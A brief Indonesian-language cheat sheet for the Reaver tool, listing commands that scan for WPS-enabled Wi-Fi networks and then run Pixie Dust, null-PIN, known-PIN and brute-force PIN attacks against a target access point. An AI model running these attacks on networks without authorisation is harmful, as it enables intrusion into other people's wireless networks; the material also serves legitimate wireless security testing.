# Reaver

#### 1. Scan Wi-Fi yang mengaktifkan WPS:

```
sudo wash -i [interface] -2 -5 -s -p
```

#### 2. Jalankan Serangan

#### Pixie Dust Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
```

#### Null PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p "" -vv
```

#### Known PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p [pin] -vv
```

#### Brute Force PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -vv
```

